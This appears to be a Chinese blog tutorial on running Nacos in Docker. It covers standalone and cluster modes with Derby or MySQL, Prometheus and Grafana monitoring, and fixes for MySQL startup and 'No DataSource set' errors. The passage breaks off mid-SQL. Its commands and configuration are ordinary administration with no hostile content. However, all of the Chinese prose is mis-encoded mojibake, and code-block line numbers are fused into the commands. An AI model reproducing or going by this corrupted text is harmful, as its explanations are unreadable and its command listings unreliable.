å•æœºæ¨¡å¼å¿«é€Ÿå¯åŠ¨ Nacosï¼Œä½¿ç”¨ MySQL æ•°æ®åº“ 1234567891011121314151617# docker run -d \\-e MODE=standalone \\-e SPRING_DATASOURCE_PLATFORM=mysql \\-e MYSQL_SERVICE_HOST=ip \\-e MYSQL_SERVICE_PORT=3306 \\-e MYSQL_SERVICE_USER=nacos \\-e MYSQL_SERVICE_PASSWORD=nacos \\-e MYSQL_SERVICE_DB_NAME=nacos_devtest \\-p 8848:8848 \\--restart=always \\--name nacos-standalone-mysql \\nacos/nacos-server:latest## ç‰¹åˆ«æ³¨æ„ï¼š## 1) MySQL æ•°æ®åº“å¿…é¡»æ˜¯å·²ç»åˆå§‹åŒ–è¿‡çš„ï¼Œå³å·²ç»åˆ›å»ºå¥½ Nacos è¿è¡Œæ‰€éœ€çš„æ•°æ®åº“è¡¨## 2) MySQL çš„ IP å¿…é¡»æ˜¯åœ¨ Nacos å®¹å™¨å†…éƒ¨å¯ä»¥ç›´æ¥è®¿é—®åˆ°çš„ IPï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸èƒ½ç›´æ¥ä½¿ç”¨ `127.0.0.1`## 3) è‹¥ MySQL ä¸æ˜¯è¿è¡Œåœ¨ Docker å®¹å™¨å†…ï¼Œè€Œæ˜¯ç›´æ¥å®‰è£…åœ¨å¤–ç½‘æˆ–è€…å®¿ä¸»æœºå†…ï¼Œå¯ä»¥æŒ‡å®š `--net=host` å‚æ•°è®© Nacos å®¹å™¨å…±äº«å®¿ä¸»æœºçš„ç½‘ç»œ 1.2ã€Clone Nacos é¡¹ç›®1234567891011# æ‹‰å–Nacosé¡¹ç›®çš„æºç $ git clone https://github.com/alibaba/nacos# åé¢ä¼šä½¿ç”¨ nacos-mysql.sql æ¥åˆå§‹åŒ–MySQLæ•°æ®åº“$ tree nacos/distribution/confâ”œâ”€â”€ application.propertiesâ”œâ”€â”€ application.properties.exampleâ”œâ”€â”€ cluster.conf.exampleâ”œâ”€â”€ nacos-mysql.sqlâ”œâ”€â”€ nacos-logback.xmlâ””â”€â”€ schema.sql 1.3ã€Clone Nacos Docker é¡¹ç›®12345678910111213141516171819202122232425262728293031323334353637# æ‹‰å–Nacos Dockeré¡¹ç›®çš„æºç $ git clone https://github.com/nacos-group/nacos-docker.git# è¿›å…¥é¡¹ç›®ç›®å½•$ cd nacos-docker# ç›®å½•ç»“æ„$ treeâ”œâ”€â”€ buildâ”‚&nbsp;&nbsp; â”œâ”€â”€ binâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ docker-startup.shâ”‚&nbsp;&nbsp; â”œâ”€â”€ confâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ application.propertiesâ”‚&nbsp;&nbsp; â”œâ”€â”€ Dockerfileâ”‚&nbsp;&nbsp; â””â”€â”€ init.dâ”‚&nbsp;&nbsp; â””â”€â”€ custom.propertiesâ”œâ”€â”€ changlogâ”œâ”€â”€ envâ”‚&nbsp;&nbsp; â”œâ”€â”€ mysql.envâ”‚&nbsp;&nbsp; â”œâ”€â”€ nacos-embedded.envâ”‚&nbsp;&nbsp; â”œâ”€â”€ nacos-hostname.envâ”‚&nbsp;&nbsp; â”œâ”€â”€ nacos-ip.envâ”‚&nbsp;&nbsp; â””â”€â”€ nacos-standlone-mysql.envâ”œâ”€â”€ exampleâ”‚&nbsp;&nbsp; â”œâ”€â”€ cluster-embedded.yamlâ”‚&nbsp;&nbsp; â”œâ”€â”€ cluster-hostname.yamlâ”‚&nbsp;&nbsp; â”œâ”€â”€ cluster-ip.yamlâ”‚&nbsp;&nbsp; â”œâ”€â”€ init.dâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ custom.propertiesâ”‚&nbsp;&nbsp; â”œâ”€â”€ prometheusâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ prometheus-cluster.yamlâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ prometheus-standalone.yamlâ”‚&nbsp;&nbsp; â”œâ”€â”€ standalone-derby.yamlâ”‚&nbsp;&nbsp; â”œâ”€â”€ standalone-mysql-5.7.yamlâ”‚&nbsp;&nbsp; â””â”€â”€ standalone-mysql-8.yamlâ”œâ”€â”€ README.mdâ””â”€â”€ README_ZH.md ç›®å½•ç»“æ„è¯´æ˜ï¼š exampleï¼šDocker-Compose ç¼–æ’ç¤ºä¾‹ example/init.dï¼šå¯åŠ¨ Nacos å®¹å™¨æ—¶çš„è‡ªå®šä¹‰é…ç½®ï¼ˆåº”ç”¨çº§åˆ«ï¼‰ï¼Œä¾‹å¦‚ Metrics ç›‘æ§ç›¸å…³çš„å†…å®¹ buildï¼šç”¨äºæ„å»º Nacos é•œåƒçš„æºç ï¼ŒåŒ…æ‹¬é…ç½®æ–‡ä»¶ã€Shell è„šæœ¬ä¸ Dockerfile envï¼šDocker-Compose çš„ç¯å¢ƒå˜é‡æ–‡ä»¶ï¼Œä¾‹å¦‚å®šä¹‰ MySQL æ•°æ®åº“çš„ç”¨æˆ·åã€å¯†ç å’Œç«¯å£å·ã€Nacos é›†ç¾¤å„èŠ‚ç‚¹çš„ IP Nacos å•æœºæ¨¡å¼å¯åŠ¨2.0ã€Nacos ç›‘æ§å…³é—­åœ¨ Nacos å®˜æ–¹çš„ Docker é¡¹ç›®é‡Œï¼ŒNacos å•æœºç‰ˆï¼ˆDerbyã€MySQL 5.7ï¼‰é»˜è®¤é›†æˆäº† Prometheus ä¸ Grafana ç›‘æ§ã€‚å³åœ¨ example/standalone-xxx.yaml é…ç½®æ–‡ä»¶é‡Œï¼Œé™¤äº†å·²ç»é…ç½®äº† Nacos çš„é•œåƒï¼Œè¿˜é…ç½®äº† Prometheusã€Grafana ä½œä¸ºç›‘æ§ç³»ç»Ÿã€‚å¦‚æœä¸éœ€è¦ç›‘æ§ Nacosï¼Œå¯ä»¥åˆ é™¤å¯¹åº”çš„é…ç½®å†…å®¹ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š 1ï¼‰é…ç½® Nacos ä¸æš´éœ² Metrics æ•°æ® 123# ç¼–è¾‘Propertiesé…ç½®æ–‡ä»¶$ vim example/init.d/custom.propertiesmanagement.endpoints.web.exposure.include=* #æ³¨é‡Šæ‰è¿™è¡Œå†…å®¹ï¼Œæ³¨é‡Šåè®¿é—®"http://{ip}:8848/nacos/actuator/prometheus" ä¸ä¼šå†çœ‹åˆ°Metricsæ•°æ® 2ï¼‰åˆ é™¤ Prometheusã€Grafana çš„ Docker-Compose é…ç½® 12345678910111213141516171819# ç¼–è¾‘YAMLé…ç½®æ–‡ä»¶ï¼Œåˆ é™¤ä»¥ä¸‹å†…å®¹$ vim example standalone-derby.yamlprometheus: container_name: prometheus image: prom/prometheus:latest volumes: - ./prometheus/prometheus-standalone.yaml:/etc/prometheus/prometheus.yml ports: - "9090:9090" depends_on: - nacos restart: on-failuregrafana: container_name: grafana image: grafana/grafana:latest ports: - 3000:3000 restart: on-failure 2.1ã€Nacos + Derbyå•æœºæ¨¡å¼å¯åŠ¨ Nacos å®¹å™¨ï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯åµŒå…¥å¼æ•°æ®åº“ Derby 12345# åˆ›å»ºå¹¶å‰å°å¯åŠ¨å®¹å™¨# docker-compose -f example/standalone-derby.yaml up# æˆ–è€…åˆ›å»ºå¹¶åå°å¯åŠ¨å®¹å™¨# docker-compose -f example/standalone-derby.yaml up -d Docker-Compose å¸¸ç”¨çš„å®¹å™¨ç®¡ç†å‘½ä»¤ï¼Œåé¢åˆ›å»ºçš„æ‰€æœ‰å®¹å™¨éƒ½å¯ä»¥è¿™æ ·ç®¡ç†ï¼Œä¸å†ç´¯è¿°ã€‚ 1234567891011# æŸ¥çœ‹å®¹å™¨çš„è¿è¡ŒçŠ¶æ€# docker-compose -f example/standalone-derby.yaml ps# å¯åŠ¨å®¹å™¨# docker-compose -f example/standalone-derby.yaml start# åœæ­¢å®¹å™¨# docker-compose -f example/standalone-derby.yaml stop# åœæ­¢å¹¶åˆ é™¤å®¹å™¨ï¼ŒåŒ…æ‹¬ç½‘ç»œã€æ•°æ®å·ï¼ˆç‰¹åˆ«æ³¨æ„ï¼Œæ­¤æ“ä½œä¼šåˆ é™¤æ‰€æœ‰å®¹å™¨çš„æ•°æ®ï¼Œä¸”ä¸å¯æ¢å¤ï¼‰# docker-compose -f example/standalone-derby.yaml down 2.2ã€Nacos + MySQL 5.7å•æœºæ¨¡å¼å¯åŠ¨ Nacos å®¹å™¨ï¼Œæ•°æ®åº“ä½¿ç”¨çš„æ˜¯ MySQL 5.7ï¼Œè¿™é‡Œéœ€è¦æ‰‹åŠ¨æ‰§è¡Œ MySQL æ•°æ®åº“åˆå§‹åŒ–æ“ä½œï¼Œå¦åˆ™ Nacos å¯åŠ¨æ—¶ä¼šæŠ›å‡º No DataSource set å¼‚å¸¸ï¼Œå¯¼è‡´æ— æ³•è¿æ¥ä¸Š MySQL æ•°æ®åº“ 12345# åˆ›å»ºå¹¶å‰å°å¯åŠ¨å®¹å™¨# docker-compose -f example/standalone-mysql-5.7.yaml up# æˆ–è€…åˆ›å»ºå¹¶åå°å¯åŠ¨å®¹å™¨# docker-compose -f example/standalone-mysql-5.7.yaml up -d 2.3ã€Nacos + MySQL 8å•æœºæ¨¡å¼å¯åŠ¨ Nacos å®¹å™¨ï¼Œæ•°æ®åº“ä½¿ç”¨çš„æ˜¯ MySQL 8ï¼Œè¿™é‡Œéœ€è¦æ‰‹åŠ¨æ‰§è¡Œ MySQL æ•°æ®åº“åˆå§‹åŒ–æ“ä½œï¼Œå¦åˆ™ Nacos å¯åŠ¨æ—¶ä¼šæŠ›å‡º No DataSource set å¼‚å¸¸ï¼Œå¯¼è‡´æ— æ³•è¿æ¥ä¸Š MySQL æ•°æ®åº“ 12345# åˆ›å»ºå¹¶å‰å°å¯åŠ¨å®¹å™¨# docker-compose -f example/standalone-mysql-8.yaml up# æˆ–è€…åˆ›å»ºå¹¶åå°å¯åŠ¨å®¹å™¨# docker-compose -f example/standalone-mysql-8.yaml up -d 2.4ã€Nacos å•æœºæ¨¡å¼æµ‹è¯•2.4.1ã€è°ƒç”¨ OPEN API1234567891011# å‘å¸ƒé…ç½®$ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=helloWorld"# è·å–é…ç½®$ curl -X GET "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test"# æœåŠ¡æ³¨å†Œ$ curl -X POST \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.naming.serviceName&amp;ip=20.18.7.10&amp;port=8080\'# æœåŠ¡å‘ç°$ curl -X GET \'http://127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=nacos.naming.serviceName\' 2.4.2ã€è®¿é—® Nacos çš„æ§åˆ¶å°æµè§ˆå™¨è®¿é—® http://127.0.0.1:8848/nacosï¼Œæ‰“å¼€ Nacos çš„æ§åˆ¶å° Nacos é›†ç¾¤æ¨¡å¼å¯åŠ¨Nacos çš„é›†ç¾¤æ¨¡å¼éœ€è¦ä¾èµ– MySQL æ•°æ®åº“ï¼ˆé›†ä¸­å¼å­˜å‚¨ï¼‰ï¼Œå› æ­¤åœ¨é›†ç¾¤æ¨¡å¼ä¸‹ä¸èƒ½å†ä½¿ç”¨ Nacos è‡ªå¸¦çš„åµŒå…¥å¼æ•°æ®åº“ Derbyã€‚åœ¨ Nacos å®˜æ–¹çš„ Docker é¡¹ç›®ä¸­ï¼Œä»¥é›†ç¾¤æ¨¡å¼å¯åŠ¨ Nacosï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯å•ä¸ª MySQL æ•°æ®åº“ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä» Nacos 1.1.4 é•œåƒå¼€å§‹ï¼Œåç»­æ‰€æœ‰é•œåƒéƒ½å·²ç»ç§»é™¤äº†ä¸»ä»é•œåƒç›¸å…³å±æ€§çš„é…ç½®ã€‚ç”±äºåœ¨ Nacos çš„ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒMySQL è‡³å°‘éœ€è¦ä¸»å¤‡æ¨¡å¼ï¼Œæˆ–è€…é‡‡ç”¨é«˜å¯ç”¨æ•°æ®åº“ï¼›å› æ­¤å¦‚æœéœ€è¦é…ç½® MySQL ä¸»ä»åº“ï¼Œéœ€è¦è‡ªè¡Œå®ç°ï¼ˆå¦‚æ­å»º DB-Proxyï¼‰ã€‚ 3.0ã€Nacos + MySQL 5.7åŸºäº HostNameï¼Œé›†ç¾¤æ¨¡å¼å¯åŠ¨ Nacos å®¹å™¨ï¼Œæ•°æ®åº“ä½¿ç”¨çš„æ˜¯ MySQL 5.7ï¼ˆå•æœºï¼‰ï¼Œè¿™é‡Œéœ€è¦æ‰‹åŠ¨æ‰§è¡Œ MySQL æ•°æ®åº“åˆå§‹åŒ–æ“ä½œï¼Œå¦åˆ™ Nacos å¯åŠ¨æ—¶ä¼šæŠ›å‡º No DataSource set å¼‚å¸¸ï¼Œå¯¼è‡´æ— æ³•è¿æ¥ä¸Š MySQL æ•°æ®åº“ 12345# åˆ›å»ºå¹¶å‰å°å¯åŠ¨å®¹å™¨# docker-compose -f example/cluster-hostname.yaml up# æˆ–è€…åˆ›å»ºå¹¶åå°å¯åŠ¨å®¹å™¨# docker-compose -f example/cluster-hostname.yaml up -d åŸºäº IPï¼Œé›†ç¾¤æ¨¡å¼å¯åŠ¨ Nacos å®¹å™¨ï¼Œæ•°æ®åº“ä½¿ç”¨çš„æ˜¯ MySQL 5.7ï¼ˆå•æœºï¼‰ï¼Œè¿™é‡Œéœ€è¦æ‰‹åŠ¨æ‰§è¡Œ MySQL æ•°æ®åº“åˆå§‹åŒ–æ“ä½œï¼Œå¦åˆ™ Nacos å¯åŠ¨æ—¶ä¼šæŠ›å‡º No DataSource set å¼‚å¸¸ï¼Œå¯¼è‡´æ— æ³•è¿æ¥ä¸Š MySQL æ•°æ®åº“ 12345# åˆ›å»ºå¹¶å‰å°å¯åŠ¨å®¹å™¨# docker-compose -f example/cluster-ip.yaml up# æˆ–è€…åˆ›å»ºå¹¶åå°å¯åŠ¨å®¹å™¨# docker-compose -f example/cluster-ip.yaml up -d æŸ¥çœ‹ Nacos çš„æ—¥å¿—æ–‡ä»¶ï¼Œè‹¥æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹æ˜¾ç¤ºï¼Œåˆ™è¯´æ˜ Nacos æ˜¯ä»¥é›†ç¾¤æ¨¡å¼å¯åŠ¨çš„ 12345678# tail -n 20 example/cluster-logs/nacos1/nacos.log# tail -n 20 example/cluster-logs/nacos2/nacos.log# tail -n 20 example/cluster-logs/nacos3/nacos.log2020-03-12 21:20:17,866 INFO Nacos started successfully in cluster mode. use external storage2020-03-12 21:20:18,117 INFO Initializing Spring DispatcherServlet \'dispatcherServlet\'2020-03-12 21:20:18,117 INFO Initializing Servlet \'dispatcherServlet\'2020-03-12 21:20:18,141 INFO Completed initialization in 23 ms 3.1ã€Nacos é›†ç¾¤æ¨¡å¼æµ‹è¯•3.1.1ã€è°ƒç”¨ OPEN API1234567891011# å‘å¸ƒé…ç½®$ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=helloWorld"# è·å–é…ç½®$ curl -X GET "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test"# æœåŠ¡æ³¨å†Œ$ curl -X POST \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.naming.serviceName&amp;ip=20.18.7.10&amp;port=8080\'# æœåŠ¡å‘ç°$ curl -X GET \'http://127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=nacos.naming.serviceName\' 3.1.2ã€è®¿é—® Nacos çš„æ§åˆ¶å°æµè§ˆå™¨è®¿é—® http://127.0.0.1:8848/nacosï¼Œæ‰“å¼€ Nacos çš„æ§åˆ¶å°ï¼›è‹¥ Nacos é›†ç¾¤å¯åŠ¨æˆåŠŸï¼Œå¯ä»¥çœ‹åˆ°å¤šä¸ª Nacos èŠ‚ç‚¹ï¼ŒDocker çš„æ˜ å°„ç«¯å£åˆ†åˆ«æ˜¯ 8848ã€8849ã€8850 Prometheus ä¸ Grafana ç›‘æ§åœ¨ Nacos å®˜æ–¹çš„ Docker é¡¹ç›®é‡Œï¼ŒNacos å•æœºç‰ˆï¼ˆDerbyã€MySQL 5.7ï¼‰é»˜è®¤é›†æˆäº† Prometheus ä¸ Grafana ç›‘æ§ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å¼€ç®±å³ç”¨ã€‚ 4.0ã€åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨12# åˆ›å»ºå¹¶åå°å¯åŠ¨å®¹å™¨# docker-compose -f example/standalone-mysql-5.7.yaml up -d 4.1ã€è°ƒç”¨ OPEN APIä¸ºäº†è®© Prometheus ä¸ Grafana çš„ç›‘æ§é¢æ¿æœ‰æ•°æ®å¯æ˜¾ç¤ºï¼Œè°ƒç”¨ OPEN API æ’å…¥æ¨¡æ‹Ÿæ•°æ® 12345# å‘å¸ƒé…ç½®$ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=helloWorld"# æœåŠ¡æ³¨å†Œ$ curl -X POST \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.naming.serviceName&amp;ip=20.18.7.10&amp;port=8080\' 4.2ã€è®¿é—® Prometheus çš„æ§åˆ¶å° 1ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:9090/graphï¼Œæ‰“å¼€ Prometheus çš„æ§åˆ¶å°ï¼ŒæŸ¥çœ‹ Prometheus é‡‡é›†åˆ°çš„ Nacos Metrics æ•°æ® 2ï¼‰åœ¨æœç´¢æ æœç´¢ nacos_monitorï¼Œè‹¥å¯ä»¥æœç´¢åˆ° Nacos çš„æ•°æ®ï¼Œåˆ™è¯´æ˜ Prometheus é‡‡é›†æ•°æ®æˆåŠŸ 3ï¼‰è‹¥ Prometheus é‡‡é›†ä¸åˆ°æ•°æ®ï¼Œæµè§ˆå™¨è®¿é—® http://{ip}:8848/nacos/actuator/prometheusï¼Œçœ‹èƒ½ä¸èƒ½è·å–åˆ° Nacos çš„ Metrics æ•°æ® 4.3ã€è®¿é—® Grafana çš„æ§åˆ¶å° 1ï¼‰ä¸‹è½½ Nacos çš„ Grafana ç›‘æ§æ¨¡ç‰ˆæ–‡ä»¶ 1234567891011# æ‹‰å–Nacos Templateé¡¹ç›®çš„æºç $ git clone https://github.com/nacos-group/nacos-template# åé¢è¦ç”¨åˆ° nacos-grafana.json ç›‘æ§æ¨¡ç‰ˆæ–‡ä»¶# tree -Nâ”œâ”€â”€ nacos-grafana.jsonâ”œâ”€â”€ nacos-sync-grafanaâ”œâ”€â”€ README.mdâ”œâ”€â”€ æ–¹æ¡ˆè¯„å®¡å†…å®¹æ¨¡æ¿.mdâ”œâ”€â”€ æ¨¡æ¿-Nacosï¼ˆå¾®è½¯é»‘ä½“ï¼‰.pptâ””â”€â”€ æ¨¡æ¿-Nacosï¼ˆå¾®è½¯é»‘ä½“ï¼‰æ–°ç‰ˆæœ¬.key 2ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:3000ï¼Œé»˜è®¤ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç ä¸º admin/adminï¼Œé¦–æ¬¡ç™»å½•ä¼šæç¤ºé‡æ–°è®¾ç½®æ–°å¯†ç  3ï¼‰åˆ›å»º Prometheus æ•°æ®æº ç‰¹åˆ«æ³¨æ„ï¼šGrafana åˆ›å»º Prometheus æ–°æ•°æ®æºæ—¶ï¼Œæ•°æ®æºåç§°ï¼ˆåŒºåˆ†è‹±æ–‡å¤§å°å†™ï¼‰å¿…é¡»æ˜¯ prometheusï¼Œæ•°æ®æºåœ°å€å¿…é¡»æ˜¯ http://prometheus:9090ï¼Œå¦åˆ™ä¼šè·å–ä¸åˆ°ç›‘æ§æ•°æ®æˆ–è€…æç¤º Gateway ç›¸å…³çš„é”™è¯¯ä¿¡æ¯ 4ï¼‰å¯¼å…¥ Nacos çš„ Grafana ç›‘æ§æ¨¡ç‰ˆæ–‡ä»¶ nacos-grafana.json 5ï¼‰Nacos Grafana å±•ç¤ºçš„æ ¸å¿ƒç›‘æ§é¡¹ Docker éƒ¨ç½²é—®é¢˜æ±‡æ€»5.0ã€MySQL å¯åŠ¨å¤±è´¥å‘ç° MySQL å®¹å™¨å¯åŠ¨å¤±è´¥ 1234567# æŸ¥çœ‹å®¹å™¨çš„è¿è¡ŒçŠ¶æ€$ docker-compose -f example/standalone-mysql-5.7.yaml psgrafana /run.sh Up 0.0.0.0:3000-&gt;3000/tcpmysql docker-entrypoint.sh mysqld Exit 1nacos-standalone-mysql bin/docker-startup.sh Up 0.0.0.0:8848-&gt;8848/tcp, 0.0.0.0:9555-&gt;9555/tcpprometheus /bin/prometheus --config.f ... Up 0.0.0.0:9090-&gt;9090/tcp æŸ¥çœ‹ MySQL çš„æ—¥å¿—ä¿¡æ¯ï¼Œå‘ç°å¯èƒ½æ˜¯ MySQL é¦–æ¬¡å¯åŠ¨æ—¶ç”Ÿæˆç›¸å…³è¯ä¹¦ï¼ˆç™»å½•ï¼‰å¤±è´¥å¯¼è‡´ 1234567891011121314151617181920212223242526272829# æŸ¥çœ‹å®¹å™¨çš„è¿è¡ŒçŠ¶æ€$ docker-compose -f example/standalone-mysql-5.7.yaml logs mysqlmysql | Database initializedmysql | Initializing certificatesmysql | Generating a RSA private keymysql | ..+++++mysql | ..................................+++++mysql | unable to write \'random state\'mysql | writing new private key to \'ca-key.pem\'mysql | -----mysql | Generating a RSA private keymysql | .......................+++++mysql | ......+++++mysql | unable to write \'random state\'mysql | writing new private key to \'server-key.pem\'mysql | -----mysql | Generating a RSA private keymysql | ..............................................................+++++mysql | ...............+++++mysql | unable to write \'random state\'mysql | writing new private key to \'client-key.pem\'mysql | -----mysql | mysql_ssl_rsa_setup: Can\'t change permissions of the file \'ca-key.pem\' (Errcode: 1 - Operation not permitted)mysql | 2020-03-12 22:13:39 [ERROR] Error setting file permissions forca-key.pem and ca.pemmysql | mysql_ssl_rsa_setup: Can\'t change permissions of the file \'server-key.pem\' (Errcode: 1 - Operation not permitted)mysql | 2020-03-12 22:13:39 [ERROR] Error setting file permissions forserver-key.pem and server-cert.pemmysql | mysql_ssl_rsa_setup: Can\'t change permissions of the file \'client-key.pem\' (Errcode: 1 - Operation not permitted)mysql | 2020-03-12 22:13:39 [ERROR] Error setting file permissions forclient-key.pem and client-cert.pem å…³é—­æ‰€æœ‰å®¹å™¨ï¼Œç„¶åå†é‡å¯æ‰€æœ‰å®¹å™¨ï¼Œè‡³æ­¤ MySQL å®¹å™¨å¯ä»¥æ­£å¸¸å¯åŠ¨ 12345678910111213# å…³é—­æ‰€æœ‰å®¹å™¨# docker-compose -f example/standalone-mysql-5.7.yaml stop# å¯åŠ¨æ‰€æœ‰å®¹å™¨# docker-compose -f example/standalone-mysql-5.7.yaml start# æŸ¥çœ‹å®¹å™¨çš„è¿è¡ŒçŠ¶æ€$ docker-compose -f example/standalone-mysql-5.7.yaml psgrafana /run.sh Up 0.0.0.0:3000-&gt;3000/tcpmysql docker-entrypoint.sh mysqld Up 0.0.0.0:3309-&gt;3306/tcp, 33060/tcpnacos-standalone-mysql bin/docker-startup.sh Up 0.0.0.0:8848-&gt;8848/tcp, 0.0.0.0:9555-&gt;9555/tcpprometheus /bin/prometheus --config.f ... Up 0.0.0.0:9090-&gt;9090/tcp 5.1ã€Nacos å¯åŠ¨å¤±è´¥5.1.1ã€åŸå› åˆ†æå®¹å™¨è™½ç„¶éƒ½å¯åŠ¨æˆåŠŸäº†ï¼Œä½†æµè§ˆå™¨æ— æ³•è®¿é—® http://127.0.0.1:8848/nacosï¼ŒæŸ¥çœ‹ Nacos çš„æ—¥å¿—æ–‡ä»¶ï¼Œå‘ç°æœ‰ No DataSource set ç›¸å…³çš„å¼‚å¸¸ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ Nacos Server æ— æ³•æ­£å¸¸è¿æ¥åˆ° MySQL æ•°æ®åº“ 1234567891011# æŸ¥çœ‹Nacosçš„æ—¥å¿—æ–‡ä»¶$ tail -n 20 example/standalone-logs/nacos.logCaused by: java.lang.IllegalStateException: No DataSource set at org.springframework.util.Assert.state(Assert.java:73) at org.springframework.jdbc.support.JdbcAccessor.obtainDataSource(JdbcAccessor.java:77) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:371) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:452) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:462) at org.springframework.jdbc.core.JdbcTemplate.queryForObject(JdbcTemplate.java:473) at org.springframework.jdbc.core.JdbcTemplate.queryForObject(JdbcTemplate.java:480) ç»è¿‡æ’æŸ¥ï¼Œå‘ç°å¯èƒ½æ˜¯ä»¥ä¸‹å‡ æ–¹é¢åŸå› é€ æˆï¼š 1ï¼‰å¼€å¯ç³»ç»Ÿé˜²ç«å¢™å¯¼è‡´ 2ï¼‰åœ¨ MySQL çš„é…ç½®æ–‡ä»¶ /etc/mysql/mysql.conf.d/mysqld.cnf é‡Œï¼Œå¼€å¯äº† bind 127.0.0.1 é…ç½®é¡¹ï¼Œå¯¼è‡´å¤–éƒ¨æ— æ³•è¿æ¥ 3ï¼‰åœ¨ MySQL æ•°æ®åº“é‡Œä¸å­˜åœ¨ nacos ç”¨æˆ·ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ env ç›®å½•ä¸‹çš„ Docker-Compose ç¯å¢ƒé…ç½®æ–‡ä»¶ä¸­ï¼ŒæŒ‡å®šäº† Nacos é»˜è®¤è¿æ¥ MySQL æ—¶ä½¿ç”¨çš„ç”¨æˆ·åå’Œå¯†ç ä¸º nacos/nacos 4ï¼‰åœ¨ MySQL æ•°æ®åº“é‡Œä¸å­˜åœ¨ nacos_devtest æ•°æ®åº“ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ env ç›®å½•ä¸‹çš„ Docker-Compose ç¯å¢ƒé…ç½®æ–‡ä»¶ä¸­ï¼ŒæŒ‡å®šäº† Nacos é»˜è®¤è¿æ¥çš„ MySQL æ•°æ®åº“ä¸º nacos_devtest åˆ†æç»“æœï¼šå„ç§å‡è®¾ç»è¿‡é€ä¸€éªŒè¯åï¼Œæœ€ç»ˆå‘ç°å¯¼è‡´ Nacos æ— æ³•è¿æ¥ MySQL æ•°æ®åº“çš„åŸå› ï¼Œæ˜¯å› ä¸ºåœ¨ MySQL æ•°æ®åº“ä¸­ï¼Œä¸å­˜åœ¨ nacos ç”¨æˆ·ï¼ŒåŒæ—¶ä¹Ÿä¸å­˜åœ¨ nacos_devtest æ•°æ®åº“ï¼Œå³ MySQL æ•°æ®åº“é‡Œæ²¡æœ‰è¢«åˆå§‹åŒ–è¿‡ 5.1.2ã€åˆå§‹åŒ– MySQL æ•°æ®åº“æ¸©é¦¨æç¤ºï¼šä»¥ä¸‹æ•°æ®åº“åˆå§‹åŒ–æ“ä½œé€‚ç”¨äº MySQL 5.7ã€MySQL 8ï¼ŒåŒæ—¶é€‚ç”¨äº Nacos å•æœºæ¨¡å¼å’Œé›†ç¾¤æ¨¡å¼ã€‚è‹¥ä½¿ç”¨äº†ä¸åŒçš„ YAML é…ç½®æ–‡ä»¶æ¥ç®¡ç† Nacos çš„é•œåƒå’Œå®¹å™¨ï¼Œæ­¤æ—¶åªéœ€è¦å°†ä¸‹åˆ—å‘½ä»¤ä¸­çš„ example/xxx.yaml æ›¿æ¢ä¸ºè‡ªå·±æ‰€ä½¿ç”¨çš„ YAML é…ç½®æ–‡ä»¶çš„è·¯å¾„å³å¯ã€‚ æ‹·è´æ•°æ®åº“åˆå§‹åŒ–è„šæœ¬ nacos-mysql.sql åˆ° MySQL å®¹å™¨çš„æ ¹ç›®å½•ä¸‹ï¼Œå¹¶åœ¨ MySQL å®¹å™¨å†…é€šè¿‡å‘½ä»¤è¡Œç™»å½•è¿› MySQL æ•°æ®åº“ 1234567891011# å¯åŠ¨æ‰€æœ‰å®¹å™¨# docker-compose -f example/standalone-mysql-5.7.yaml start# æ‹·è´æ•°æ®åº“åˆå§‹åŒ–è„šæœ¬åˆ°MySQLå®¹å™¨çš„æ ¹ç›®å½•ä¸‹# docker cp nacos/distribution/conf/nacos-mysql.sql mysql:/# è¿æ¥MySQLå®¹å™¨# docker exec -it mysql /bin/bash# åœ¨MySQLå®¹å™¨å†…ï¼Œé€šè¿‡å‘½ä»¤è¡Œç™»å½•è¿›MySQLæ•°æ®åº“ï¼›åœ¨ç»ˆç«¯è¾“å…¥"mysql"åï¼Œç›´æ¥æŒ‰ä¸‹å›è½¦é”®å³å¯ï¼Œä¸éœ€è¦æŒ‡å®šæ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œé»˜è®¤æ˜¯ä»¥rootç”¨æˆ·ç™»å½•# mysql åœ¨ MySQL çš„å®¹å™¨å†…ç™»å½•è¿› MySQL æ•°æ®åº“åï¼Œæ‰§è¡Œæ•°æ®åº“åˆå§‹åŒ–æ“ä½œ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# åˆ›å»ºç”¨æˆ·mysql&gt; CREATE USER \'nacos\'@\'%\' IDENTIFIED BY \'nacos\';# åˆ›å»ºæ•°æ®åº“mysql&gt; create database nacos_devtest default character set 